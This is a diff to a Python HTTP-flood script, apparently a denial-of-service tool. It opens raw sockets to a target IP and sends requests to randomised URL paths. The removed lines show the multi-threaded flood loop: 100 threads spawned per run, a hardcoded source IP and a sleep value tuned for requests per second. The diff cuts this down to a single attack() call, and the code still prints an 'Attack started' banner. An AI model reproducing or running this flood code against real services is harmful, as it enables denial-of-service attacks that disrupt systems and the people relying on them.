@@ -32,8 +32,8 @@ def generate_url_path():
 
 
 # Perform the request
-def attack(thread_num, thread_num_mutex):
-    print_status(thread_num, thread_num_mutex)
+def attack():#thread_num, thread_num_mutex):
+    # print_status(thread_num, thread_num_mutex)
     url_path = generate_url_path()
 
     # Create a raw socket
@@ -54,23 +54,24 @@ def attack(thread_num, thread_num_mutex):
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
 
-def http_flood(SOURCE_IP="10.1.5.3", count=100):
+def run():#SOURCE_IP="10.1.5.3", count=100):
     # Create a shared variable for thread counts
-    thread_num = 0
-    thread_num_mutex = threading.Lock()
-    print (f"[#] Attack started on ({TARGET_IP} ) || Port: {str(port)} || # Requests: {str(count)}")
+    # thread_num = 0
+    # thread_num_mutex = threading.Lock()
+    print (f"[#] Attack started on ({TARGET_IP} ) || Port: {str(port)}")# || # Requests: {str(count)}")
 
     # Spawn a thread per request
-    all_threads = []
-    for _ in range(count):
-        t1 = threading.Thread(target=attack, args=(thread_num, thread_num_mutex,))
-        t1.start()
-        all_threads.append(t1)
+    # all_threads = []
+    # for _ in range(count):
+    # t1 = threading.Thread(target=attack, args=(thread_num, thread_num_mutex,))
+    # t1.start()
+    attack()
+    # all_threads.append(t1)
 
-        # Adjusting this sleep time will affect requests per second
-        time.sleep(0.01)
+    # Adjusting this sleep time will affect requests per second
+    # time.sleep(0.01)
 
-    for current_thread in all_threads:
-        current_thread.join()  # Make the main thread wait for the children threads
+    # t1.join()
 
-http_flood("10.1.5.3", 100)
+    # for current_thread in all_threads:
+    #     current_thread.join()  # Make the main thread wait for the children threads
